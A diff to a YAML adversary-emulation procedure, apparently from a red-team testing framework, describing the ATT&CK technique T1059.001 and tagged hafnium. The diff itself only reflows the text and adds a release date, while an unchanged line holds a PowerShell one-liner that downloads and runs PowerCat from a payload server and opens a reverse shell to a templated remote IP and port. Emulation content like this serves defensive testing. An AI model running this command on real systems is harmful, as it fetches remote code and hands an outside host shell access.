@@ -1,6 +1,9 @@
 id: 1ccc757b-cd16-4f62-bf06-91019a9bed44
 name: Create remote Powershell with PowerCat
-description: PowerCat is a tool that uses native PowerShell components to allow an attacker to tansfer files, send and serve reverses shells, and relays similar to NetCat over TCP, SMB, and UDP. This procedure downloads PowerCat from Github, then uses it to open a connection to a remote server using PowerShell.
+description: PowerCat is a tool that uses native PowerShell components to allow an
+  attacker to tansfer files, send and serve reverses shells, and relays similar to
+  NetCat over TCP, SMB, and UDP. This procedure downloads PowerCat from Github, then
+  uses it to open a connection to a remote server using PowerShell.
 tactic: execution
 technique:
   id: T1059.001
@@ -12,7 +15,8 @@ platforms:
         IEX (New-ObjectNet.WebClient).DownloadString('#{operator.payloads}/command-and-control/powercat.ps1'); powercat -c #{execution.remote.ip} -p #{execution.remote.port} -e powershell
 metadata:
   authors:
-    - bfuzzy1
+  - bfuzzy1
   tags:
-    - hafnium
+  - hafnium
   version: 2
+  release_date: 2021-08-25
